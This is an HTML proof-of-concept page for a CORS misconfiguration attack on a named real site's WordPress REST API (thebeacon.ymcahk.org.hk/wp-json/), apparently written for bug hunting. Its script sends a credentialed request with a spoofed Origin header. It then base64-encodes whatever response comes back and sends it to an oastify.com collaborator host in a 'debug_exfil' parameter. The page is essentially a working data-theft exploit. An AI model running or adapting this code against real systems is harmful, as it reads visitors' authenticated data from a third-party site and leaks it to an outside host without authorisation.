<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS PoC - Debug Version</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 30px; background: #f9f9f9; }
        button { font-size: 18px; padding: 15px 30px; background: #d32f2f; color: white; border: none; cursor: pointer; }
        pre { background: #1e1e1e; color: #00ff00; padding: 15px; overflow: auto; margin-top: 20px; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h1>CORS PoC - Debug Mode</h1>
    <p>Target: https://thebeacon.ymcahk.org.hk/wp-json/</p>

    <button onclick="runTest()">🚀 Run CORS Test</button>

    <pre id="output">Click the button...</pre>

    <script>
    const target = "https://thebeacon.ymcahk.org.hk/wp-json/";
    const attackerOrigin = "https://8dms12b9dmuxdkev5oahheadg4mva0yp.oastify.com";   // Your GitHub Pages origin
    const collab = "8dms12b9dmuxdkev5oahheadg4mva0yp.oastify.com"; // ← CHANGE THIS

    function runTest() {
        const output = document.getElementById("output");
        output.textContent = "[+] Starting fetch with Origin header...\n";

        fetch(target, {
            method: "GET",
            credentials: "include",
            headers: {
                "Accept": "application/json",
                "Origin": attackerOrigin
            }
        })
        .then(response => {
            output.textContent += `Status: ${response.status}\n`;
            output.textContent += `ACAO: ${response.headers.get("Access-Control-Allow-Origin") || "Not present"}\n`;
            output.textContent += `ACAC: ${response.headers.get("Access-Control-Allow-Credentials") || "Not present"}\n\n`;
            return response.text();
        })
        .then(data => {
            output.textContent += "[+] Data received!\nExfiltrating to Collaborator...\n";
            const exfilUrl = `https://${collab}/?debug_exfil=` + encodeURIComponent(btoa(data));
            fetch(exfilUrl, { mode: "no-cors" });
        })
        .catch(err => {
            output.textContent += "[-] FETCH ERROR: " + err.message + "\n";
            output.textContent += "→ This usually means the browser blocked the request due to CORS policy.\n";
            console.error("CORS Error Details:", err);
        });
    }
    </script>
</body>
</html>
